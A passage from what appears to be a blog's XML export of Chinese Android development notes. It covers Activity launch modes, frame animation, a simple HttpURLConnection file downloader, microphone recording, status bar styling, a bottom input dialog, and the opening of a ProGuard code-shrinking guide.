<h3 id="3-singleTask-栈内复用模式（栈内单例模式）"><a href="#3-singleTask-栈内复用模式（栈内单例模式）" class="headerlink" title="3.singleTask 栈内复用模式（栈内单例模式）"></a>3.singleTask 栈内复用模式（栈内单例模式）</h3><p>一个任务栈内，只有一个实例，即一个App(任务栈)内一个实例<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android:launchMode=&quot;singleTask&quot;</span><br></pre></td></tr></table></figure></p>
<p>如果Activity实例处于任务栈栈内，但不处于栈顶，启动该Activity会把此实例移到栈顶，并将该实例上面的Activity移除。<br>使用场景：打开很多页面，一键返回到主页（主页Activity处于singleTask模式）</p>
<h3 id="4-SingleInstance全局单例模式"><a href="#4-SingleInstance全局单例模式" class="headerlink" title="4.SingleInstance全局单例模式"></a>4.SingleInstance全局单例模式</h3><p>多个任务栈内，只有一个实例，即一部手机（系统运行时）内一个实例<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android:launchMode=&quot;singleInstance&quot;</span><br></pre></td></tr></table></figure></p>
<p>无论是从哪一个任务栈Task中启动Activity，只会创建一个Activity实例，并且使用一个全新的Task栈来加载该Activity实例。</p>
<h3 id="5-清除任务栈"><a href="#5-清除任务栈" class="headerlink" title="5.清除任务栈"></a>5.清除任务栈</h3><p>增加两个Flags可以销毁旧的任务栈，重新建立一个任务栈，使用场景：含有多个Activity在任务栈，一步实现“退出登录”。<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">val intent = Intent(this,LoginActivity::class.java)</span><br><span class="line">//清除任务栈</span><br><span class="line">intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)</span><br><span class="line">intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)</span><br><span class="line">startActivity(intent)</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>启动模式</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 帧动画</title>
    <url>/Android/Android%20%E5%B8%A7%E5%8A%A8%E7%94%BB/</url>
    <content><![CDATA[<p>/drawable/start.xml<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">animation-list</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:oneshot</span>=<span class="string">"false"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">android:drawable</span>=<span class="string">"@drawable/img1"</span> <span class="attr">android:duration</span>=<span class="string">"200"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">android:drawable</span>=<span class="string">"@drawable/img2"</span> <span class="attr">android:duration</span>=<span class="string">"100"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">animation-list</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>android:oneshot=”false” 表示一直播放（循环）</p>
</blockquote>
<p>设置为background<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:id</span>=<span class="string">"@+id/image"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:background</span>=<span class="string">"@drawable/start"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>启动动画<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> image = findViewById&lt;ImageView&gt;(R.id.image)</span><br><span class="line">(image.background <span class="keyword">as</span> AnimationDrawable).start()</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>动画</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 思源字体</title>
    <url>/Android/Android%20%E6%80%9D%E6%BA%90%E5%AD%97%E4%BD%93/</url>
    <content><![CDATA[<p><a href="http://www.google.cn/get/noto/" target="_blank" rel="noopener">【思源字体下载】</a></p>
<p>Google 已经将 <a href="https://www.google.cn/get/noto/help/cjk/" target="_blank" rel="noopener">【Noto Sans CJK】</a>(思源黑体的 Google 版)作为 Android 5.0 以后的系统字体，字体体积一个比如 Bold 就有 16MB，不过Android已经自带了。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>字体</tag>
      </tags>
  </entry>
  <entry>
    <title>Android-Studio下载地址</title>
    <url>/Android/Android-Studio%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80/</url>
    <content><![CDATA[<p><a href="https://developer.android.google.cn/studio/index.html#win-bundle" target="_blank" rel="noopener">稳定版</a></p>
<p><a href="https://developer.android.google.cn/studio/preview?utm_source=android-studio" target="_blank" rel="noopener">预览版</a></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
  </entry>
  <entry>
    <title>Android-列表Item滑出菜单方案选择</title>
    <url>/Android/Android-%E5%88%97%E8%A1%A8Item%E6%BB%91%E5%87%BA%E8%8F%9C%E5%8D%95%E6%96%B9%E6%A1%88%E9%80%89%E6%8B%A9/</url>
    <content><![CDATA[<p>Android 列表现在有两种选择：<code>ListView</code>和<code>RecyclerView</code></p>
<h4 id="SwipeMenuListView-："><a href="#SwipeMenuListView-：" class="headerlink" title="SwipeMenuListView ："></a><a href="https://github.com/baoyongzhang/SwipeMenuListView" target="_blank" rel="noopener">SwipeMenuListView</a> ：</h4><p>它是<code>ListView</code>的扩展，作为一个自定义view；</p>
<p><img src="https://raw.githubusercontent.com/baoyongzhang/SwipeMenuListView/master/demo.gif" alt></p>
<h4 id="AndroidSwipeLayout"><a href="#AndroidSwipeLayout" class="headerlink" title="AndroidSwipeLayout "></a><a href="https://github.com/daimajia/AndroidSwipeLayout" target="_blank" rel="noopener">AndroidSwipeLayout </a></h4><p>支持 <code>ListView/Gridview</code> 和 <code>RecyclerView</code></p>
<p>使用方法：<a href="https://github.com/daimajia/AndroidSwipeLayout/wiki/usage" target="_blank" rel="noopener">https://github.com/daimajia/AndroidSwipeLayout/wiki/usage</a></p>
<p><img src="http://ww2.sinaimg.cn/mw690/610dc034jw1ejoplapwtqg208n0e74dx.gif" alt></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
  </entry>
  <entry>
    <title>Android 简单文件下载</title>
    <url>/Android/Android%20%E7%AE%80%E5%8D%95%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
    <content><![CDATA[<p>Android 上有很多优秀的第三方下载库，功能很强大，如断点续传，异步等。</p>
<p>为了快速下载一个小文件，有时候并不需要牛刀，利用Android自带的 <code>java.net.HttpURLConnection</code> 即可以完成下载，应用场景，比如小的缓存文件，用子线程同步下载即可。</p>
<p>步骤（经典的阻塞输入/输出流读写）：</p>
<ol>
<li>连接</li>
<li>获取输入流</li>
<li>读取buffer写入到本地文件输出流</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MiniFileDownload</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TAG = <span class="string">"MiniFileDownload"</span>;</span><br><span class="line">    <span class="class"><span class="keyword">interface</span> <span class="title">DownloadCallBack</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">onError</span><span class="params">(Exception e)</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">onOK</span><span class="params">(File file)</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">onProgress</span><span class="params">(<span class="keyword">float</span> progress)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">(String url, File saveFile, DownloadCallBack callBack)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(saveFile.exists())&#123;</span><br><span class="line">            saveFile.delete();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(callBack == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        HttpURLConnection conn;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//连接URL服务器</span></span><br><span class="line">            conn = (HttpURLConnection)<span class="keyword">new</span> URL(url).openConnection();</span><br><span class="line">            conn.setConnectTimeout(<span class="number">3</span> * <span class="number">1000</span>);</span><br><span class="line">            conn.setUseCaches(<span class="keyword">false</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            callBack.onError(e);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        InputStream is = <span class="keyword">null</span>;</span><br><span class="line">        BufferedOutputStream bos = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//判断响应码，如果服务器不响应错误，开始下载。</span></span><br><span class="line">            <span class="keyword">if</span> (conn.getResponseCode() != <span class="number">200</span>)&#123;</span><br><span class="line">                Log.e(TAG,<span class="string">"ResponseCode = "</span> + conn.getResponseCode());</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//获取文件总大小</span></span><br><span class="line">            <span class="keyword">int</span> contentLength = conn.getContentLength();</span><br><span class="line">            Log.d(TAG,<span class="string">"content Length = "</span> + contentLength);</span><br><span class="line">            <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span> offset = <span class="number">0</span> ;</span><br><span class="line">            <span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//本地文件输出流</span></span><br><span class="line">            bos = <span class="keyword">new</span> BufferedOutputStream( <span class="keyword">new</span> FileOutputStream(saveFile) );</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取输入流</span></span><br><span class="line">            is = conn.getInputStream();</span><br><span class="line">            <span class="comment">//循环读（下载）</span></span><br><span class="line">            <span class="keyword">while</span> ((len = is.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">                Log.d(TAG,<span class="string">"read buffer len = "</span> + len);</span><br><span class="line">                bos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">                offset += len;</span><br><span class="line">                Log.d(TAG,<span class="string">"offset = "</span> + offset + <span class="string">" ;total="</span> + contentLength);</span><br><span class="line">                <span class="comment">//计算进度</span></span><br><span class="line">                <span class="keyword">float</span> progress = (<span class="keyword">float</span>)offset / (<span class="keyword">float</span>)contentLength;</span><br><span class="line">                Log.d(TAG,<span class="string">"progress = "</span> + progress);</span><br><span class="line">                <span class="comment">//更新进度到回调，UI层可以显示下载进度</span></span><br><span class="line">                callBack.onProgress(progress);</span><br><span class="line">            &#125;</span><br><span class="line">            Log.d(TAG,<span class="string">"ok"</span>);</span><br><span class="line">            callBack.onOK(saveFile);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            callBack.onError(e);</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//关闭资源</span></span><br><span class="line">            <span class="keyword">if</span>(is != <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    is.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(bos != <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    bos.flush();</span><br><span class="line">                    bos.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            conn.disconnect();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>ndk</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 录音简单示例</title>
    <url>/Android/Android%20%E5%BD%95%E9%9F%B3%E7%AE%80%E5%8D%95%E7%A4%BA%E4%BE%8B/</url>
    <content><![CDATA[<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">requestPermissions(<span class="keyword">new</span> String[]&#123;<span class="string">"android.permission.RECORD_AUDIO"</span>&#125;,<span class="number">1009</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RecordAudioThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        AudioRecord recorder;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>.run();</span><br><span class="line">            <span class="keyword">int</span> minBufferSize = AudioRecord.getMinBufferSize(</span><br><span class="line">                    <span class="number">8000</span>,</span><br><span class="line">                    AudioFormat.CHANNEL_IN_MONO,</span><br><span class="line">                    AudioFormat.ENCODING_PCM_16BIT);</span><br><span class="line">            recorder = <span class="keyword">new</span> AudioRecord(</span><br><span class="line">                    MediaRecorder.AudioSource.MIC,</span><br><span class="line">                    <span class="number">8000</span>,</span><br><span class="line">                    AudioFormat.CHANNEL_IN_MONO,</span><br><span class="line">                    AudioFormat.ENCODING_PCM_16BIT,</span><br><span class="line">                    minBufferSize);</span><br><span class="line">            recorder.startRecording();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] audio = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> readLength = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (!isInterrupted())&#123;</span><br><span class="line">                readLength = recorder.read(audio,<span class="number">0</span>,audio.length);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(readLength &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    Log.d(TAG, <span class="string">"录音长度："</span> + readLength);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            recorder.stop();</span><br><span class="line">            recorder.release();</span><br><span class="line">            Log.i(Thread.currentThread().getName() , <span class="string">"录音结束"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>录音</tag>
      </tags>
  </entry>
  <entry>
    <title>Android6.0状态栏白底黑字</title>
    <url>/Android/Android6.0%E7%8A%B6%E6%80%81%E6%A0%8F%E7%99%BD%E5%BA%95%E9%BB%91%E5%AD%97/</url>
    <content><![CDATA[<p>Android6.0以上才支持修改状态栏字体颜色(亮色)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.M) &#123;</span><br><span class="line">		this.getWindow().getDecorView().setSystemUiVisibility(</span><br><span class="line">		View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN|</span><br><span class="line">		View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR</span><br><span class="line">	);//亮色</span><br><span class="line">	getWindow().setStatusBarColor(Color.WHITE);//设置状态栏背景色为白色</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果要适配4.4以上的，推荐用<a href="https://github.com/gyf-dev/ImmersionBar" target="_blank" rel="noopener">ImmersionBar</a></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 软键盘底部输入框</title>
    <url>/Android/Android%20%E8%BD%AF%E9%94%AE%E7%9B%98%E5%BA%95%E9%83%A8%E8%BE%93%E5%85%A5%E6%A1%86/</url>
    <content><![CDATA[<p>备忘一下这个底部输入框的效果：<br><img src="/images/android/底部输入框.png" alt="效果"></p>
<p>用DialogFragment实现挺方便的，大致的方法就是创建一个底部DialogFragment，布局内EditText聚焦，用代码主动弹出软键盘来。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BottomInputFragment</span> : <span class="type">DialogFragment</span></span>()&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onCreate</span><span class="params">(savedInstanceState: <span class="type">Bundle</span>?)</span></span> &#123;</span><br><span class="line">            <span class="keyword">super</span>.onCreate(savedInstanceState)</span><br><span class="line">            setStyle(STYLE_NO_TITLE, R.style.BottomInputDialog)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onStart</span><span class="params">()</span></span> &#123;</span><br><span class="line">            <span class="keyword">super</span>.onStart()</span><br><span class="line">            <span class="keyword">val</span> window = dialog!!.window</span><br><span class="line">            dialog!!.setCanceledOnTouchOutside(<span class="literal">true</span>)</span><br><span class="line">            <span class="keyword">val</span> params = window!!.attributes</span><br><span class="line">            params.gravity = Gravity.BOTTOM</span><br><span class="line">            params.width = WindowManager.LayoutParams.MATCH_PARENT</span><br><span class="line">            window.attributes = params</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onCreateView</span><span class="params">(inflater: <span class="type">LayoutInflater</span>, container: <span class="type">ViewGroup</span>?, savedInstanceState: <span class="type">Bundle</span>?)</span></span>: View? &#123;</span><br><span class="line">            <span class="keyword">return</span> inflater.inflate(R.layout.dialog_edittext, container, <span class="literal">false</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onViewCreated</span><span class="params">(view: <span class="type">View</span>, savedInstanceState: <span class="type">Bundle</span>?)</span></span> &#123;</span><br><span class="line">            <span class="keyword">super</span>.onViewCreated(view, savedInstanceState)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">val</span> editText = view.findViewById&lt;EditText&gt;(R.id.editText)</span><br><span class="line">            showSoftInputFromWindow(editText)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">fun</span> <span class="title">showSoftInputFromWindow</span><span class="params">(editText: <span class="type">EditText</span>)</span></span> &#123;</span><br><span class="line">            editText.isFocusable = <span class="literal">true</span></span><br><span class="line">            editText.isFocusableInTouchMode = <span class="literal">true</span></span><br><span class="line">            editText.requestFocus()</span><br><span class="line">            <span class="keyword">val</span> inputManager: InputMethodManager = editText.context.getSystemService(Context.INPUT_METHOD_SERVICE) <span class="keyword">as</span> InputMethodManager</span><br><span class="line">            inputManager.showSoftInput(editText, <span class="number">0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>弹框的Style R.style.BottomInputDialog</strong><br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"BottomInputDialog"</span> <span class="attr">parent</span>=<span class="string">"AppTheme"</span>&gt;</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">"android:layout_width"</span>&gt;</span>match_parent<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">"android:layout_height"</span>&gt;</span>wrap_content<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">"android:windowIsFloating"</span>&gt;</span>true<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">"android:backgroundDimEnabled"</span>&gt;</span>false<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">"android:windowSoftInputMode"</span>&gt;</span>stateAlwaysVisible<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><strong>弹框的布局 R.layout.dialog_edittext</strong><br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:background</span>=<span class="string">"#fff"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">View</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"1px"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">"#3e3e3e"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/editText"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"100dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:padding</span>=<span class="string">"8dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:gravity</span>=<span class="string">"start|top"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">"#efefef"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_margin</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:maxLines</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:focusable</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:focusableInTouchMode</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:hint</span>=<span class="string">"友善是交流的起点"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:inputType</span>=<span class="string">"textMultiLine"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"60dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"40dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">"end"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginEnd</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginBottom</span>=<span class="string">"8dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textSize</span>=<span class="string">"14sp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"发布"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">View</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"1px"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">"#3e3e3e"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><strong>调用</strong><br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">show</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">val</span> fm: FragmentManager = supportFragmentManager</span><br><span class="line">    <span class="keyword">val</span> bif = BottomInputFragment()</span><br><span class="line">    bif.show(fm, <span class="string">"bif"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>软键盘</tag>
      </tags>
  </entry>
  <entry>
    <title>Android动画基础</title>
    <url>/Android/Android%E5%8A%A8%E7%94%BB%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p><a href="https://www.cnblogs.com/whoislcj/p/5730520.html" target="_blank" rel="noopener">【Android动画效果之Tween Animation（补间动画）】</a><br><a href="https://www.cnblogs.com/whoislcj/p/5733740.html" target="_blank" rel="noopener">【Android动画效果之Frame Animation（逐帧动画）】</a><br><a href="https://www.cnblogs.com/whoislcj/p/5738478.html" target="_blank" rel="noopener">【Android动画效果之初识Property Animation（属性动画）】</a></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
  </entry>
  <entry>
    <title>Android-混淆</title>
    <url>/Android/Android-%E6%B7%B7%E6%B7%86/</url>
    <content><![CDATA[<p>拷贝以下的内容（<a href="https://developer.android.com/studio/build/shrink-code.html" target="_blank" rel="noopener">https://developer.android.com/studio/build/shrink-code.html</a><br>），以防平时不能访问 ，有条件的可以访问原文，排版更好，看得舒服。</p>
<p>压缩代码和资源</p>
<p>要尽可能减小 APK 文件，您应该启用压缩来移除发布构建中未使用的代码和资源。此页面介绍如何执行该操作，以及如何指定要在构建时保留或舍弃的代码和资源。<br>代码压缩通过 ProGuard 提供，ProGuard 会检测和移除封装应用中未使用的类、字段、方法和属性，包括自带代码库中的未使用项（这使其成为以变通方式解决 <a href="https://developer.android.com/studio/build/multidex.html" target="_blank" rel="noopener">64k 引用限制</a>的有用工具）。ProGuard 还可优化字节码，移除未使用的代码指令，以及用短名称混淆其余的类、字段和方法。混淆过的代码可令您的 APK 难以被逆向工程，这在应用使用<a href="https://developer.android.com/google/play/licensing/overview.html" target="_blank" rel="noopener">许可验证</a>等安全敏感性功能时特别有用。<br>资源压缩通过适用于 Gradle 的 Android 插件提供，该插件会移除封装应用中未使用的资源，包括代码库中未使用的资源。它可与代码压缩发挥协同效应，使得在移除未使用的代码后，任何不再被引用的资源也能安全地移除。<br>本文介绍的功能依赖下列组件：<br><a href="https://developer.android.com/studio/releases/sdk-tools.html" target="_blank" rel="noopener">SDK Tools</a> 25.0.10 或更高版本<br><a href="https://developer.android.com/studio/releases/gradle-plugin.html" target="_blank" rel="noopener">适用于 Gradle 的 Android 插件</a> 2.0.0 或更高版本</p>
<p>压缩代码</p>
